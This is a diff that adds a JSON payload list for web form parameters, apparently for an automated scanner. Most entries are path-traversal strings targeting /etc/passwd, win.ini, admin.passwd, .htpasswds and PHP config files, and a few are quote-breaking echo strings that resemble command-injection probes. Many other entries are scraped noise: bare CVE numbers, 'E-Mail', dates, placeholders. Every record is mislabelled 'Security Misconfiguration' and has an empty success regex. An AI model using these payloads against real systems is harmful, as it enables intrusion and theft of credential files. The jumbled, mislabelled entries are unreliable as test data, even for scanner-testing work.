@@ -1,0 +1,607 @@
+[
+  {
+    "payload_id": "OWP-56292",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": ".NET",
+    "injection_point": "form_parameter",
+    "payload_string": "[PlanID]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56305",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": ".NET",
+    "injection_point": "form_parameter",
+    "payload_string": "\\../../\\",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56306",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": ".NET",
+    "injection_point": "form_parameter",
+    "payload_string": "../../\\",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56560",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": ".NET",
+    "injection_point": "form_parameter",
+    "payload_string": "\\.....\\\\\\.....\\\\\\.....\\\\http://www.example.com/RTE_file_browser.asp?look",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56561",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": ".NET",
+    "injection_point": "form_parameter",
+    "payload_string": "\\.....\\\\\\.....\\\\\\.....\\\\\\.....\\\\\\.....\\\\\\",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56985",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "/var/www/data/modules/legacy/config.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56986",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "/var/www/lighttpd.conf",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56987",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "/usr/local/nexus/server/conf/MessagingConfig.xml",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56988",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "/usr/local/nexus/server/conf/FC-334-NTSC.ini",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56989",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "/usr/local/nexus/server/conf/scheduler.xml",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56990",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "/tmp/SW_versions.txt",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56991",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "/usr/local/nexus/hardware/hardware.cfg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56992",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "/var/www/data/config/app/clear.sh",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56993",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "/var/www/data/config/app/users.txt",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-56994",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "/usr/local/nexus/server/conf/admin.passwd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57230",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "/otherwebapp",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57231",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "WEB-INF/classes/com/webapp/app/target.class",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57277",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "CVE-2019-19774",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57278",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "E-Mail",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57391",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Java",
+    "injection_point": "form_parameter",
+    "payload_string": "/PRM",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57392",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Java",
+    "injection_point": "form_parameter",
+    "payload_string": "/ORDER/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57516",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "CVE-2016-0956",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57517",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "articles/2016/02/10/apache-sling-fw-v236-remote-slingpostservlet-exception-vulnerability",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57827",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "user.2020-04-28_00-00-17.tar",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57828",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "admin.2020-04-28_00-00-17.tar",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57829",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "[USER/ADMIN].[YYYY-MM-DD_HH-MM-SS].tar",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57830",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "user.2020-**-**_00-00-17.tar",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-58477",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "*admin*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-58478",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "*test*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-59134",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "/home/user/.htpasswds",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-59135",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "/var",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-60377",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "2009-06-28",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-60462",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "check-display-name",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-61174",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "[LOGIN]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-61175",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "[PASSWORD]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-61186",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "\" echo MAPSCRIPTROOTDIR=%MAPSCRIPTROOTDIR%",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-61187",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "\" echo MAPSCRIPTBATCH_FILE=%MAPSCRIPTBATCH_FILE%",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-61188",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "\" echo Command line mode %STATIC% %ACCOUNT%",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-61189",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "\" echo Interractive mode",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-61190",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "\" echo Global section",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-61191",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "\" echo Static section",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-61192",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "\" echo Dynamic section",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-62655",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "../include/config.inc.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-62783",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "[../../../]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-62784",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "../../../]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-63302",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "[runcmsinstallationpath]\\mainfile.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-63523",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "../somefile",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-63570",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "../index.php\u0000.js",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-64177",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "../include.html.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-64178",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "../settings.html.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-64493",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "inurl:wp-content/backup.log*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-64661",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "/../../../../../../etc/passwd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-64662",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "/../../../../../../etc/hosts",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-64856",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../windows/win.ini",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-65166",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "CVE-2017-14955",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
